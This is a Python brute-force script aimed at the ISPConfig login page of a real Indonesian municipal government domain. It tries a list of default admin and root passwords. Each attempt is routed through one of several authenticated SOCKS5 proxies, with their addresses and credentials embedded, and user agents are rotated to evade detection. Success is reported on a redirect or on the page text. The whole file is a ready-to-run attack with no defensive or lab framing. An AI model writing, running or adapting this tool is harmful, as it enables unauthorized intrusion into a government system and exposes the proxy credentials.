import requests
import socks
import socket
import sys
import random
import time

# --- CONFIGURATION ---
TARGET_URL = "https://surakarta.go.id:8080/login/"
PROXIES = [
    "23.95.150.145:6114:oyyvimta:3olvpyzbkfhq",
    "198.23.239.134:6540:oyyvimta:3olvpyzbkfhq",
    "107.172.163.27:6543:oyyvimta:3olvpyzbkfhq",
    "198.105.121.200:6462:oyyvimta:3olvpyzbkfhq",
    "64.137.96.74:6641:oyyvimta:3olvpyzbkfhq",
    "216.10.27.159:6837:oyyvimta:3olvpyzbkfhq",
    "23.26.71.145:5628:oyyvimta:3olvpyzbkfhq"
]

CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "surakarta"),
    ("root", "root"),
    ("root", "password"),
    ("admin", "123456"),
    ("ISPConfig", "admin"),
    ("admin", "ispconfig"),
    ("sysadmin", "password"),
    ("webmaster", "password")
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
]

def get_random_proxy():
    try:
        p = random.choice(PROXIES).split(":")
        return (p[0], int(p[1]), p[2], p[3])
    except IndexError:
        return None

def set_proxy():
    proxy_info = get_random_proxy()
    if proxy_info:
        ip, port, user, pwd = proxy_info
        socks.set_default_proxy(socks.SOCKS5, ip, port, username=user, password=pwd)
        socket.socket = socks.socksocket
        # print(f"[*] Proxy: {ip}:{port}") # Reduced verbosity

def brute_force():
    print(f"\n[+] Starting ISPConfig Brute Force on {TARGET_URL}")
    print(f"[*] Loaded {len(CREDENTIALS)} target credentials.")
    
    for username, password in CREDENTIALS:
        set_proxy() # Rotate proxy per attempt
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # ISPConfig login parameters usually: username, password
        data = {
            "username": username,
            "password": password,
            "s_mod": "login", 
            "s_pg": "index"
        }
        
        try:
            print(f"[*] Testing: {username} | {password} ... ", end="")
            r = requests.post(TARGET_URL, data=data, headers=headers, verify=False, timeout=10, allow_redirects=False)
            
            # Check for success indicators
            # 302 Redirect usually means successful login
            if r.status_code == 302:
                print(f"[SUCCESS] Login Found! Creds: {username}:{password}")
                print(f"[>] Redirected to: {r.headers.get('Location')}")
                return True
            elif "Welcome" in r.text or "Logout" in r.text:
                print(f"[SUCCESS] Login Found (Content match)! Creds: {username}:{password}")
                return True
            else:
                print(f"[Failed] (Status: {r.status_code})")
                
        except Exception as e:
            print(f"[Error] {str(e)[:50]}...")
            time.sleep(1) 

    print("\n[-] Brute Force Complete. No valid credentials found in wordlist.")
    return False

if __name__ == "__main__":
    try:
        brute_force()
    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
